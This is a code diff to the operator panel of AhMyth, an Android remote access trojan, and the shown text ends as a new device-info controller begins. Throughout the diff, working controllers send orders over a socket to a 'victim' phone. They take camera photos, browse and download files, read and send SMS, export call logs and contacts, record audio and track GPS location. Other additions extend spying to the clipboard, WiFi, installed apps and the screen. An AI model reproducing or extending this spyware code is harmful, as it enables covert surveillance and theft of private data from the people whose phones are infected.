@@ -4,13 +4,56 @@ var app = angular.module('myappy', ['ngRoute', 'infinite-scroll']);
 var fs = require("fs-extra");
 const CONSTANTS = require(__dirname + '/assets/js/Constants')
 var ORDER = CONSTANTS.order;
-var socket = remote.getCurrentWebContents().victim;
+var originalSocket = remote.getCurrentWebContents().victim;
 var homedir = require('node-homedir');
 var path = require("path");
 
 var dataPath = path.join(homedir(), CONSTANTS.dataDir);
 var downloadsPath = path.join(dataPath, CONSTANTS.downloadPath);
 var outputPath = path.join(dataPath, CONSTANTS.outputApkPath);
+var logPath = path.join(dataPath, 'Logs');
+
+// Ensure log directory exists
+if (!fs.existsSync(logPath)) {
+    fs.mkdirSync(logPath, { recursive: true });
+}
+
+// Debug log file
+var debugLogFile = path.join(logPath, `debug-${new Date().toISOString().split('T')[0]}.log`);
+
+// Log to file function
+function logToFile(type, command, data) {
+    const timestamp = new Date().toISOString();
+    const dataStr = typeof data === 'object' ? JSON.stringify(data, null, 2) : String(data || '');
+    const truncatedData = dataStr.length > 5000 ? dataStr.substring(0, 5000) + '\n...[truncated]' : dataStr;
+    const logEntry = `\n[${timestamp}] [${type}] ${command}\n${'='.repeat(60)}\n${truncatedData}\n`;
+    
+    try {
+        fs.appendFileSync(debugLogFile, logEntry);
+    } catch (e) {
+        console.error('Error writing to debug log:', e);
+    }
+    
+    // Also log to console for immediate visibility
+    console.log(`[AhMyth ${type}] ${command}:`, dataStr.substring(0, 500));
+}
+
+// Wrap socket with logging
+var socket = {
+    emit: function(event, data) {
+        logToFile('REQUEST', event, data);
+        return originalSocket.emit(event, data);
+    },
+    on: function(event, callback) {
+        return originalSocket.on(event, function(data) {
+            logToFile('RESPONSE', event, data);
+            callback(data);
+        });
+    },
+    removeAllListeners: function(event) {
+        return originalSocket.removeAllListeners(event);
+    }
+};
 
 //-----------------------Routing Config------------------------
 app.config(function ($routeProvider) {
@@ -45,6 +88,26 @@ app.config(function ($routeProvider) {
         .when("/location", {
             templateUrl: "./views/location.html",
             controller: "LocCtrl"
+        })
+        .when("/deviceInfo", {
+            templateUrl: "./views/deviceInfo.html",
+            controller: "DeviceInfoCtrl"
+        })
+        .when("/apps", {
+            templateUrl: "./views/apps.html",
+            controller: "AppsCtrl"
+        })
+        .when("/clipboard", {
+            templateUrl: "./views/clipboard.html",
+            controller: "ClipboardCtrl"
+        })
+        .when("/wifi", {
+            templateUrl: "./views/wifi.html",
+            controller: "WiFiCtrl"
+        })
+        .when("/screen", {
+            templateUrl: "./views/screen.html",
+            controller: "ScreenCtrl"
         });
 });
 
@@ -54,47 +117,96 @@ app.config(function ($routeProvider) {
 // controller for Lab.html and its views mic.html,camera.html..etc
 app.controller("LabCtrl", function ($scope, $rootScope, $location) {
     $labCtrl = $scope;
-    var log = document.getElementById("logy");
     $labCtrl.logs = [];
 
-    const window = remote.getCurrentWindow();
+    // Wait for DOM to be ready
+    setTimeout(() => {
+        var log = document.getElementById("logy");
+        if (!log) {
+            console.error("[AhMyth Lab] Logy element not found!");
+        }
+    }, 100);
+
+    // Handle remote module with fallback
+    let electronWindow;
+    try {
+        electronWindow = remote.getCurrentWindow();
+    } catch (e) {
+        console.error("[AhMyth Lab] Remote module not available:", e);
+        electronWindow = null;
+    }
+
     $labCtrl.close = () => {
-        window.close();
+        if (electronWindow) {
+            electronWindow.close();
+        } else {
+            ipcRenderer.send('window-close');
+        }
     };
 
     $labCtrl.maximize = () => {
-        if (window.isMaximized()) {
-            window.unmaximize(); // Restore the window size
+        if (electronWindow) {
+            if (electronWindow.isMaximized()) {
+                electronWindow.unmaximize(); // Restore the window size
+            } else {
+                electronWindow.maximize(); // Maximize the window
+            }
         } else {
-            window.maximize(); // Maximize the window
+            ipcRenderer.send('window-maximize');
         }
     };
 
 
+    // Enhanced logging with timestamps
     $rootScope.Log = (msg, status) => {
         var fontColor = CONSTANTS.logColors.DEFAULT;
         if (status == CONSTANTS.logStatus.SUCCESS)
             fontColor = CONSTANTS.logColors.GREEN;
         else if (status == CONSTANTS.logStatus.FAIL)
             fontColor = CONSTANTS.logColors.RED;
+        else if (status == CONSTANTS.logStatus.INFO)
+            fontColor = CONSTANTS.logColors.YELLOW;
+        else if (status == CONSTANTS.logStatus.WARNING)
+            fontColor = CONSTANTS.logColors.ORANGE;
 
-        $labCtrl.logs.push({ date: new Date().toLocaleString(), msg: msg, color: fontColor });
-        log.scrollTop = log.scrollHeight;
-        if (!$labCtrl.$$phase)
+        const now = new Date();
+        const timestamp = now.toLocaleString('en-US', {
+            hour: '2-digit',
+            minute: '2-digit',
+            second: '2-digit',
+            hour12: false
+        });
+
+        $labCtrl.logs.push({ 
+            date: `[${timestamp}]`, 
+            msg: msg, 
+            color: fontColor 
+        });
+        
+        // Ensure log element exists before scrolling
+        setTimeout(() => {
+            var log = document.getElementById("logy");
+            if (log) {
+                log.scrollTop = log.scrollHeight;
+            }
+        }, 0);
+        
+        if (!$labCtrl.$$phase) {
             $labCtrl.$apply();
+        }
     }
 
     //fired when notified from Main Proccess (main.js) about
     // this victim who disconnected
     ipcRenderer.on('SocketIO:VictimDisconnected', (event) => {
-        $rootScope.Log('Victim Disconnected', CONSTANTS.logStatus.FAIL);
+        $rootScope.Log('[✗] Victim disconnected', CONSTANTS.logStatus.FAIL);
     });
 
 
     //fired when notified from the Main Process (main.js) about
     // the Server disconnection
     ipcRenderer.on('SocketIO:ServerDisconnected', (event) => {
-        $rootScope.Log('[¡] Server Disconnected', CONSTANTS.logStatus.INFO);
+        $rootScope.Log('[⚠] Server disconnected', CONSTANTS.logStatus.WARNING);
     });
 
 
@@ -121,72 +233,89 @@ app.controller("LabCtrl", function ($scope, $rootScope, $location) {
 app.controller("CamCtrl", function ($scope, $rootScope) {
     $camCtrl = $scope;
     $camCtrl.isSaveShown = false;
+    $camCtrl.cameras = [];
+    $camCtrl.selectedCam = null;
+    $camCtrl.imgUrl = null;
+    $camCtrl.load = '';
     var camera = CONSTANTS.orders.camera;
+    var currentBase64 = null;
 
-    // remove socket listner if the camera page is changed or destroied
+    // remove socket listener
     $camCtrl.$on('$destroy', () => {
-        // release resources, cancel Listner...
         socket.removeAllListeners(camera);
     });
 
+    // Select camera
+    $camCtrl.selectCamera = (cam) => {
+        $camCtrl.selectedCam = cam;
+        $rootScope.Log(`[ℹ] Selected: ${cam.name || (cam.id == 0 ? 'Back Camera' : 'Front Camera')}`, CONSTANTS.logStatus.INFO);
+    };
 
-    $rootScope.Log('Get cameras list');
-    $camCtrl.load = 'loading';
-    // send order to victim to bring camera list
-    socket.emit(ORDER, { order: camera, extra: 'camList' });
+    // Take picture
+    $camCtrl.snap = () => {
+        if (!$camCtrl.selectedCam) {
+            $rootScope.Log('[⚠] Please select a camera first', CONSTANTS.logStatus.WARNING);
+            return;
+        }
+        $camCtrl.load = 'loading';
+        $rootScope.Log('[→] Taking picture...', CONSTANTS.logStatus.INFO);
+        socket.emit(ORDER, { order: camera, extra: String($camCtrl.selectedCam.id) });
+    };
 
+    // Save photo
+    $camCtrl.savePhoto = () => {
+        if (!currentBase64) return;
+        $rootScope.Log('[→] Saving picture...', CONSTANTS.logStatus.INFO);
+        var picPath = path.join(downloadsPath, Date.now() + ".jpg");
+        fs.outputFile(picPath, Buffer.from(currentBase64, "base64"), (err) => {
+            if (!err)
+                $rootScope.Log(`[✓] Picture saved: ${picPath}`, CONSTANTS.logStatus.SUCCESS);
+            else
+                $rootScope.Log('[✗] Failed to save picture', CONSTANTS.logStatus.FAIL);
+        });
+    };
 
+    // Fullscreen - open in new window
+    $camCtrl.fullscreen = () => {
+        if ($camCtrl.imgUrl) {
+            let win = window.open();
+            win.document.write('<img src="' + $camCtrl.imgUrl + '" style="max-width:100%;height:auto;">');
+        }
+    };
 
-    // wait any response from victim
+    // Socket handler
     socket.on(camera, (data) => {
-        if (data.camList == true) { // the rseponse is camera list
-            $rootScope.Log('Cameras list arrived', CONSTANTS.logStatus.SUCCESS);
+        $camCtrl.load = '';
+        
+        if (data.camList == true) {
+            $rootScope.Log(`[✓] Found ${data.list.length} camera(s)`, CONSTANTS.logStatus.SUCCESS);
             $camCtrl.cameras = data.list;
-            $camCtrl.load = '';
-            $camCtrl.selectedCam = $camCtrl.cameras[1];
+            // Auto-select first camera
+            if (data.list.length > 0) {
+                $camCtrl.selectedCam = data.list[0];
+            }
             $camCtrl.$apply();
-        } else if (data.image == true) { // the rseponse is picture
-
-            $rootScope.Log('Picture arrived', CONSTANTS.logStatus.SUCCESS);
-
-            // convert binary to base64
+        } else if (data.image == true) {
+            $rootScope.Log('[✓] Picture captured', CONSTANTS.logStatus.SUCCESS);
+            
+            // Convert binary to base64
             var uint8Arr = new Uint8Array(data.buffer);
             var binary = '';
             for (var i = 0; i < uint8Arr.length; i++) {
                 binary += String.fromCharCode(uint8Arr[i]);
             }
-            var base64String = window.btoa(binary);
-
-            $camCtrl.imgUrl = 'data:image/png;base64,' + base64String;
+            currentBase64 = window.btoa(binary);
+            
+            $camCtrl.imgUrl = 'data:image/jpeg;base64,' + currentBase64;
             $camCtrl.isSaveShown = true;
             $camCtrl.$apply();
-
-            $camCtrl.savePhoto = () => {
-                $rootScope.Log('Saving picture..');
-                var picPath = path.join(downloadsPath, Date.now() + ".jpg");
-                fs.outputFile(picPath, new Buffer(base64String, "base64"), (err) => {
-                    if (!err)
-                        $rootScope.Log('Picture saved on ' + picPath, CONSTANTS.logStatus.SUCCESS);
-                    else
-                        $rootScope.Log('Saving picture failed', CONSTANTS.logStatus.FAIL);
-
-                });
-
-            }
-
         }
     });
 
-
-    $camCtrl.snap = () => {
-        // send snap request to victim
-        $rootScope.Log('Snap a picture');
-        socket.emit(ORDER, { order: camera, extra: $camCtrl.selectedCam.id });
-    }
-
-
-
-
+    // Initial load - get camera list
+    $rootScope.Log('[→] Fetching camera list...', CONSTANTS.logStatus.INFO);
+    $camCtrl.load = 'loading';
+    socket.emit(ORDER, { order: camera, extra: 'camList' });
 });
 
 
@@ -200,71 +329,159 @@ app.controller("FmCtrl", function ($scope, $rootScope) {
     $fmCtrl = $scope;
     $fmCtrl.load = 'loading';
     $fmCtrl.files = [];
+    $fmCtrl.currentPath = '/storage/emulated/0';
+    $fmCtrl.pathHistory = [];
+    $fmCtrl.canGoBack = false;
+    $fmCtrl.pathParts = [];
+    $fmCtrl.folderCount = 0;
+    $fmCtrl.fileCount = 0;
+    $fmCtrl.totalSize = 0;
     var fileManager = CONSTANTS.orders.fileManager;
 
-
-    // remove socket listner
+    // remove socket listener
     $fmCtrl.$on('$destroy', () => {
-        // release resources
         socket.removeAllListeners(fileManager);
     });
 
-    // limit the ng-repeat
     // infinite scrolling
-    $fmCtrl.barLimit = 30;
+    $fmCtrl.barLimit = 50;
     $fmCtrl.increaseLimit = () => {
-        $fmCtrl.barLimit += 30;
+        $fmCtrl.barLimit += 50;
+    };
+
+    // Update path parts for breadcrumb
+    function updatePathParts(path) {
+        $fmCtrl.pathParts = [];
+        if (!path || path === '/') return;
+        
+        let parts = path.split('/').filter(p => p);
+        let currentPath = '';
+        parts.forEach(part => {
+            currentPath += '/' + part;
+            $fmCtrl.pathParts.push({ name: part, path: currentPath });
+        });
     }
 
-    // send request to victim to bring files
-    $rootScope.Log('Get files list');
-    // socket.emit(ORDER, { order: fileManager, extra: 'ls', path: '/' });
-    socket.emit(ORDER, { order: fileManager, extra: 'ls', path: '/storage/emulated/0/' });
+    // Update file stats
+    function updateStats() {
+        $fmCtrl.folderCount = $fmCtrl.files.filter(f => f.isDir).length;
+        $fmCtrl.fileCount = $fmCtrl.files.filter(f => !f.isDir).length;
+        $fmCtrl.totalSize = $fmCtrl.files.reduce((acc, f) => acc + (f.size || 0), 0);
+    }
 
-    socket.on(fileManager, (data) => {
-        if (data.file == true) { // response with file's binary
-            $rootScope.Log('Saving file..');
-            var filePath = path.join(downloadsPath, data.name);
+    // Format file size
+    $fmCtrl.formatSize = (bytes) => {
+        if (!bytes || bytes === 0) return '0 B';
+        const sizes = ['B', 'KB', 'MB', 'GB'];
+        const i = Math.floor(Math.log(bytes) / Math.log(1024));
+        return (bytes / Math.pow(1024, i)).toFixed(1) + ' ' + sizes[i];
+    };
 
-            // function to save the file to my local disk
-            fs.outputFile(filePath, data.buffer, (err) => {
-                if (err)
-                    $rootScope.Log('Saving file failed', CONSTANTS.logStatus.FAIL);
-                else
-                    $rootScope.Log('File saved on ' + filePath, CONSTANTS.logStatus.SUCCESS);
-            });
-
-        } else if (data.length != 0) { // response with files list
-            $rootScope.Log('Files list arrived', CONSTANTS.logStatus.SUCCESS);
-            $fmCtrl.load = '';
-            $fmCtrl.files = data;
-            $fmCtrl.$apply();
-        } else {
-            $rootScope.Log('That directory is inaccessible (Access denied)', CONSTANTS.logStatus.FAIL);
-            $fmCtrl.load = '';
-            $fmCtrl.$apply();
-        }
-
-    });
-
-
-    // when foder is clicked
-    $fmCtrl.getFiles = (file) => {
-        if (file != null) {
+    // Navigate to path
+    $fmCtrl.goToPath = (path) => {
+        if (path) {
+            $fmCtrl.pathHistory.push($fmCtrl.currentPath);
+            $fmCtrl.canGoBack = true;
+            $fmCtrl.currentPath = path;
             $fmCtrl.load = 'loading';
-            $rootScope.Log('Get ' + file);
-            socket.emit(ORDER, { order: fileManager, extra: 'ls', path: '/' + file });
+            $fmCtrl.barLimit = 50;
+            updatePathParts(path);
+            $rootScope.Log(`[→] Opening: ${path}`, CONSTANTS.logStatus.INFO);
+            socket.emit(ORDER, { order: fileManager, extra: 'ls', path: path });
         }
     };
 
-    // when save button is clicked
-    // send request to bring file's' binary
-    $fmCtrl.saveFile = (file) => {
-        $rootScope.Log('Downloading ' + '/' + file);
-        socket.emit(ORDER, { order: fileManager, extra: 'dl', path: '/' + file });
-    }
+    // Go back
+    $fmCtrl.goBack = () => {
+        if ($fmCtrl.pathHistory.length > 0) {
+            let prevPath = $fmCtrl.pathHistory.pop();
+            $fmCtrl.canGoBack = $fmCtrl.pathHistory.length > 0;
+            $fmCtrl.currentPath = prevPath;
+            $fmCtrl.load = 'loading';
+            $fmCtrl.barLimit = 50;
+            updatePathParts(prevPath);
+            $rootScope.Log(`[→] Going back to: ${prevPath}`, CONSTANTS.logStatus.INFO);
+            socket.emit(ORDER, { order: fileManager, extra: 'ls', path: prevPath });
+        }
+    };
 
+    // Go home
+    $fmCtrl.goHome = () => {
+        $fmCtrl.pathHistory = [];
+        $fmCtrl.canGoBack = false;
+        $fmCtrl.goToPath('/storage/emulated/0');
+    };
+
+    // Refresh current directory
+    $fmCtrl.refreshDir = () => {
+        $fmCtrl.load = 'loading';
+        $fmCtrl.barLimit = 50;
+        $rootScope.Log(`[→] Refreshing: ${$fmCtrl.currentPath}`, CONSTANTS.logStatus.INFO);
+        socket.emit(ORDER, { order: fileManager, extra: 'ls', path: $fmCtrl.currentPath });
+    };
+
+    // Copy path to clipboard
+    $fmCtrl.copyPath = () => {
+        if (navigator.clipboard) {
+            navigator.clipboard.writeText($fmCtrl.currentPath);
+            $rootScope.Log('[✓] Path copied to clipboard', CONSTANTS.logStatus.SUCCESS);
+        }
+    };
+
+    // When folder/file is clicked
+    $fmCtrl.getFiles = (item) => {
+        if (item && item.isDir) {
+            let newPath = item.path || ($fmCtrl.currentPath + '/' + item.name);
+            $fmCtrl.goToPath(newPath);
+        }
+    };
+
+    // Save/download file
+    $fmCtrl.saveFile = (file) => {
+        let filePath = file.path || ($fmCtrl.currentPath + '/' + file.name);
+        $rootScope.Log(`[→] Downloading: ${filePath}`, CONSTANTS.logStatus.INFO);
+        socket.emit(ORDER, { order: fileManager, extra: 'dl', path: filePath });
+    };
+
+    // Socket handler
+    socket.on(fileManager, (data) => {
+        if (data.file == true) {
+            // File download response
+            $rootScope.Log('[→] Downloading file...', CONSTANTS.logStatus.INFO);
+            var filePath = path.join(downloadsPath, data.name);
+            fs.outputFile(filePath, data.buffer, (err) => {
+                if (err)
+                    $rootScope.Log('[✗] Failed to save file', CONSTANTS.logStatus.FAIL);
+                else
+                    $rootScope.Log(`[✓] File saved: ${filePath}`, CONSTANTS.logStatus.SUCCESS);
+            });
+        } else if (Array.isArray(data) && data.length > 0) {
+            // Directory listing response
+            $rootScope.Log(`[✓] Found ${data.length} items`, CONSTANTS.logStatus.SUCCESS);
+            $fmCtrl.load = '';
+            $fmCtrl.files = data.sort((a, b) => {
+                // Folders first, then alphabetical
+                if (a.isDir && !b.isDir) return -1;
+                if (!a.isDir && b.isDir) return 1;
+                return (a.name || '').localeCompare(b.name || '');
+            });
+            updateStats();
+            $fmCtrl.$apply();
+        } else {
+            $rootScope.Log('[⚠] Directory empty or access denied', CONSTANTS.logStatus.WARNING);
+            $fmCtrl.load = '';
+            $fmCtrl.files = [];
+            updateStats();
+            $fmCtrl.$apply();
+        }
+    });
+
+    // Initial load
+    $rootScope.Log('[→] Loading file manager...', CONSTANTS.logStatus.INFO);
+    updatePathParts($fmCtrl.currentPath);
+    socket.emit(ORDER, { order: fileManager, extra: 'ls', path: $fmCtrl.currentPath });
 });
+
 
 
 
@@ -291,7 +508,7 @@ app.controller("SMSCtrl", function ($scope, $rootScope) {
     $SMSCtrl.getSMSList = () => {
         $SMSCtrl.load = 'loading';
         $SMSCtrl.barLimit = 50;
-        $rootScope.Log('Get SMS list..');
+        $rootScope.Log('[→] Fetching SMS list...', CONSTANTS.logStatus.INFO);
         socket.emit(ORDER, { order: sms, extra: 'ls' });
     }
 
@@ -301,7 +518,7 @@ app.controller("SMSCtrl", function ($scope, $rootScope) {
 
     // send request to victim to send sms
     $SMSCtrl.SendSMS = (phoneNo, msg) => {
-        $rootScope.Log('Sending SMS..');
+        $rootScope.Log(`[→] Sending SMS to ${phoneNo}...`, CONSTANTS.logStatus.INFO);
         socket.emit(ORDER, { order: sms, extra: 'sendSMS', to: phoneNo, sms: msg });
     }
 
@@ -319,12 +536,12 @@ app.controller("SMSCtrl", function ($scope, $rootScope) {
 
         var csvStr = csvRows.join("\n");
         var csvPath = path.join(downloadsPath, "SMS_" + Date.now() + ".csv");
-        $rootScope.Log("Saving SMS List...");
+        $rootScope.Log("[→] Saving SMS list...", CONSTANTS.logStatus.INFO);
         fs.outputFile(csvPath, csvStr, (error) => {
             if (error)
-                $rootScope.Log("Saving " + csvPath + " Failed", CONSTANTS.logStatus.FAIL);
+                $rootScope.Log(`[✗] Failed to save: ${csvPath}`, CONSTANTS.logStatus.FAIL);
             else
-                $rootScope.Log("SMS List Saved on " + csvPath, CONSTANTS.logStatus.SUCCESS);
+                $rootScope.Log(`[✓] SMS list saved: ${csvPath}`, CONSTANTS.logStatus.SUCCESS);
 
         });
 
@@ -335,15 +552,15 @@ app.controller("SMSCtrl", function ($scope, $rootScope) {
     socket.on(sms, (data) => {
         if (data.smsList) {
             $SMSCtrl.load = '';
-            $rootScope.Log('SMS list arrived', CONSTANTS.logStatus.SUCCESS);
+            $rootScope.Log(`[✓] SMS list received: ${data.smsList.length} messages`, CONSTANTS.logStatus.SUCCESS);
             $SMSCtrl.smsList = data.smsList;
             $SMSCtrl.smsSize = data.smsList.length;
             $SMSCtrl.$apply();
         } else {
             if (data == true)
-                $rootScope.Log('SMS sent', CONSTANTS.logStatus.SUCCESS);
+                $rootScope.Log('[✓] SMS sent successfully', CONSTANTS.logStatus.SUCCESS);
             else
-                $rootScope.Log('SMS not sent', CONSTANTS.logStatus.FAIL);
+                $rootScope.Log('[✗] Failed to send SMS', CONSTANTS.logStatus.FAIL);
         }
     });
 
@@ -373,7 +590,7 @@ app.controller("CallsCtrl", function ($scope, $rootScope) {
     });
 
     $CallsCtrl.load = 'loading';
-    $rootScope.Log('Get Calls list..');
+    $rootScope.Log('[→] Fetching call logs...', CONSTANTS.logStatus.INFO);
     socket.emit(ORDER, { order: calls });
 
 
@@ -396,12 +613,12 @@ app.controller("CallsCtrl", function ($scope, $rootScope) {
 
         var csvStr = csvRows.join("\n");
         var csvPath = path.join(downloadsPath, "Calls_" + Date.now() + ".csv");
-        $rootScope.Log("Saving Calls List...");
+        $rootScope.Log("[→] Saving call logs...", CONSTANTS.logStatus.INFO);
         fs.outputFile(csvPath, csvStr, (error) => {
             if (error)
-                $rootScope.Log("Saving " + csvPath + " Failed", CONSTANTS.logStatus.FAIL);
+                $rootScope.Log(`[✗] Failed to save: ${csvPath}`, CONSTANTS.logStatus.FAIL);
             else
-                $rootScope.Log("Calls List Saved on " + csvPath, CONSTANTS.logStatus.SUCCESS);
+                $rootScope.Log(`[✓] Call logs saved: ${csvPath}`, CONSTANTS.logStatus.SUCCESS);
 
         });
 
@@ -410,7 +627,7 @@ app.controller("CallsCtrl", function ($scope, $rootScope) {
     socket.on(calls, (data) => {
         if (data.callsList) {
             $CallsCtrl.load = '';
-            $rootScope.Log('Calls list arrived', CONSTANTS.logStatus.SUCCESS);
+            $rootScope.Log(`[✓] Call logs received: ${data.callsList.length} entries`, CONSTANTS.logStatus.SUCCESS);
             $CallsCtrl.callsList = data.callsList;
             $CallsCtrl.logsSize = data.callsList.length;
             $CallsCtrl.$apply();
@@ -438,7 +655,7 @@ app.controller("ContCtrl", function ($scope, $rootScope) {
     });
 
     $ContCtrl.load = 'loading';
-    $rootScope.Log('Get Contacts list..');
+    $rootScope.Log('[→] Fetching contacts...', CONSTANTS.logStatus.INFO);
     socket.emit(ORDER, { order: contacts });
 
     $ContCtrl.barLimit = 50;
@@ -458,12 +675,12 @@ app.controller("ContCtrl", function ($scope, $rootScope) {
 
         var csvStr = csvRows.join("\n");
         var csvPath = path.join(downloadsPath, "Contacts_" + Date.now() + ".csv");
-        $rootScope.Log("Saving Contacts List...");
+        $rootScope.Log("[→] Saving contacts...", CONSTANTS.logStatus.INFO);
         fs.outputFile(csvPath, csvStr, (error) => {
             if (error)
-                $rootScope.Log("Saving " + csvPath + " Failed", CONSTANTS.logStatus.FAIL);
+                $rootScope.Log(`[✗] Failed to save: ${csvPath}`, CONSTANTS.logStatus.FAIL);
             else
-                $rootScope.Log("Contacts List Saved on " + csvPath, CONSTANTS.logStatus.SUCCESS);
+                $rootScope.Log(`[✓] Contacts saved: ${csvPath}`, CONSTANTS.logStatus.SUCCESS);
 
         });
 
@@ -472,7 +689,7 @@ app.controller("ContCtrl", function ($scope, $rootScope) {
     socket.on(contacts, (data) => {
         if (data.contactsList) {
             $ContCtrl.load = '';
-            $rootScope.Log('Contacts list arrived', CONSTANTS.logStatus.SUCCESS);
+            $rootScope.Log(`[✓] Contacts received: ${data.contactsList.length} contacts`, CONSTANTS.logStatus.SUCCESS);
             $ContCtrl.contactsList = data.contactsList;
             $ContCtrl.contactsSize = data.contactsList.length;
             $ContCtrl.$apply();
@@ -504,10 +721,10 @@ app.controller("MicCtrl", function ($scope, $rootScope) {
 
         if (seconds) {
             if (seconds > 0) {
-                $rootScope.Log('Recording ' + seconds + "'s...");
+                $rootScope.Log(`[→] Recording audio for ${seconds} seconds...`, CONSTANTS.logStatus.INFO);
                 socket.emit(ORDER, { order: mic, sec: seconds });
             } else
-                $rootScope.Log('Seconds must be more than 0');
+                $rootScope.Log('[⚠] Recording duration must be greater than 0', CONSTANTS.logStatus.WARNING);
 
         }
 
@@ -516,7 +733,7 @@ app.controller("MicCtrl", function ($scope, $rootScope) {
 
     socket.on(mic, (data) => {
         if (data.file == true) {
-            $rootScope.Log('Audio arrived', CONSTANTS.logStatus.SUCCESS);
+            $rootScope.Log('[✓] Audio recording received', CONSTANTS.logStatus.SUCCESS);
 
             var player = document.getElementById('player');
             var sourceMp3 = document.getElementById('sourceMp3');
@@ -534,13 +751,13 @@ app.controller("MicCtrl", function ($scope, $rootScope) {
             player.play();
 
             $MicCtrl.SaveAudio = () => {
-                $rootScope.Log('Saving file..');
+                $rootScope.Log('[→] Saving audio file...', CONSTANTS.logStatus.INFO);
                 var filePath = path.join(downloadsPath, data.name);
                 fs.outputFile(filePath, data.buffer, (err) => {
                     if (err)
-                        $rootScope.Log('Saving file failed', CONSTANTS.logStatus.FAIL);
+                        $rootScope.Log('[✗] Failed to save audio', CONSTANTS.logStatus.FAIL);
                     else
-                        $rootScope.Log('File saved on ' + filePath, CONSTANTS.logStatus.SUCCESS);
+                        $rootScope.Log(`[✓] Audio saved: ${filePath}`, CONSTANTS.logStatus.SUCCESS);
                 });
 
 
@@ -558,54 +775,644 @@ app.controller("MicCtrl", function ($scope, $rootScope) {
 
 
 //-----------------------Location Controller (location.htm)------------------------
-// Location controller
-app.controller("LocCtrl", function ($scope, $rootScope) {
+// Location controller - FIXED
+app.controller("LocCtrl", function ($scope, $rootScope, $timeout) {
     $LocCtrl = $scope;
     var location = CONSTANTS.orders.location;
+    $LocCtrl.currentLocation = null;
+    $LocCtrl.lastUpdate = null;
+    
+    var map = null;
+    var marker = null;
 
     $LocCtrl.$on('$destroy', () => {
         // release resources, cancel Listner...
         socket.removeAllListeners(location);
+        if (map) {
+            map.remove();
+            map = null;
+        }
     });
 
-
-    var map = L.map('mapid').setView([51.505, -0.09], 13);
-    L.tileLayer('http://{s}.tile.osm.org/{z}/{x}/{y}.png', {}).addTo(map);
-
-    $LocCtrl.Refresh = () => {
-
-        $LocCtrl.load = 'loading';
-        $rootScope.Log('Get Location..');
-        socket.emit(ORDER, { order: location });
-
+    // Initialize map after DOM is ready
+    function initMap() {
+        $timeout(() => {
+            const mapContainer = document.getElementById('mapid');
+            if (mapContainer && !map) {
+                try {
+                    // Set explicit height
+                    mapContainer.style.height = '100%';
+                    mapContainer.style.minHeight = '300px';
+                    
+                    // Initialize Leaflet map
+                    map = L.map('mapid', {
+                        center: [51.505, -0.09],
+                        zoom: 13,
+                        zoomControl: true
+                    });
+                    
+                    // Add tile layer with dark theme
+                    L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+                        attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors &copy; <a href="https://carto.com/attributions">CARTO</a>',
+                        subdomains: 'abcd',
+                        maxZoom: 19
+                    }).addTo(map);
+                    
+                    // Force map to recalculate size
+                    setTimeout(() => {
+                        map.invalidateSize();
+                    }, 100);
+                    setTimeout(() => {
+                        map.invalidateSize();
+                    }, 500);
+                    setTimeout(() => {
+                        map.invalidateSize();
+                    }, 1000);
+                    
+                    $rootScope.Log('[✓] Map initialized successfully', CONSTANTS.logStatus.SUCCESS);
+                } catch (e) {
+                    console.error('[AhMyth] Map initialization error:', e);
+                    $rootScope.Log('[✗] Failed to initialize map', CONSTANTS.logStatus.FAIL);
+                }
+            } else if (!mapContainer) {
+                // Retry after a short delay
+                $timeout(initMap, 200);
+            }
+        }, 100);
     }
 
+    // Initialize map
+    initMap();
 
+    $LocCtrl.Refresh = () => {
+        $LocCtrl.load = 'loading';
+        $rootScope.Log('[→] Requesting GPS location...', CONSTANTS.logStatus.INFO);
+        socket.emit(ORDER, { order: location });
+    }
 
-    $LocCtrl.load = 'loading';
-    $rootScope.Log('Get Location..');
-    socket.emit(ORDER, { order: location });
+    // Auto-request location on load
+    $timeout(() => {
+        $LocCtrl.load = 'loading';
+        $rootScope.Log('[→] Requesting GPS location...', CONSTANTS.logStatus.INFO);
+        socket.emit(ORDER, { order: location });
+    }, 500);
 
-
-    var marker;
     socket.on(location, (data) => {
         $LocCtrl.load = '';
+        
         if (data.enable) {
-            if (data.lat == 0 && data.lng == 0)
-                $rootScope.Log('Try to Refresh', CONSTANTS.logStatus.FAIL);
-            else {
-                $rootScope.Log('Location arrived => ' + data.lat + "," + data.lng, CONSTANTS.logStatus.SUCCESS);
+            if (data.lat == 0 && data.lng == 0) {
+                $rootScope.Log('[⚠] Location unavailable, please try again', CONSTANTS.logStatus.WARNING);
+            } else {
+                $rootScope.Log(`[✓] Location received: ${data.lat.toFixed(6)}, ${data.lng.toFixed(6)}`, CONSTANTS.logStatus.SUCCESS);
+                
+                // Update current location
+                $LocCtrl.currentLocation = {
+                    lat: data.lat.toFixed(6),
+                    lng: data.lng.toFixed(6),
+                    accuracy: data.accuracy ? `${data.accuracy}m` : null
+                };
+                $LocCtrl.lastUpdate = new Date().toLocaleTimeString();
+                
                 var victimLoc = new L.LatLng(data.lat, data.lng);
-                if (!marker)
-                    var marker = L.marker(victimLoc).addTo(map);
-                else
-                    marker.setLatLng(victimLoc).update();
-
-                map.panTo(victimLoc);
+                
+                // Wait for map to be ready
+                if (map) {
+                    if (!marker) {
+                        // Create custom marker icon
+                        var markerIcon = L.divIcon({
+                            className: 'custom-marker',
+                            html: '<div style="width: 20px; height: 20px; background: #00d4aa; border: 3px solid #fff; border-radius: 50%; box-shadow: 0 0 10px rgba(0,212,170,0.5);"></div>',
+                            iconSize: [20, 20],
+                            iconAnchor: [10, 10]
+                        });
+                        marker = L.marker(victimLoc, { icon: markerIcon }).addTo(map);
+                        marker.bindPopup(`<b>Device Location</b><br>Lat: ${data.lat.toFixed(6)}<br>Lng: ${data.lng.toFixed(6)}`);
+                    } else {
+                        marker.setLatLng(victimLoc).update();
+                        marker.setPopupContent(`<b>Device Location</b><br>Lat: ${data.lat.toFixed(6)}<br>Lng: ${data.lng.toFixed(6)}`);
+                    }
+                    
+                    map.setView(victimLoc, 15);
+                    
+                    // Invalidate size to ensure proper rendering
+                    setTimeout(() => {
+                        map.invalidateSize();
+                    }, 100);
+                }
             }
-        } else
-            $rootScope.Log('Location Service is not enabled on Victim\'s Device', CONSTANTS.logStatus.FAIL);
-
+        } else {
+            $rootScope.Log('[✗] Location service is disabled on device', CONSTANTS.logStatus.FAIL);
+        }
+        
+        if (!$LocCtrl.$$phase) {
+            $LocCtrl.$apply();
+        }
     });
 
+});
+
+//-----------------------Device Info Controller------------------------
+app.controller("DeviceInfoCtrl", function ($scope, $rootScope) {
+    $DeviceInfoCtrl = $scope;
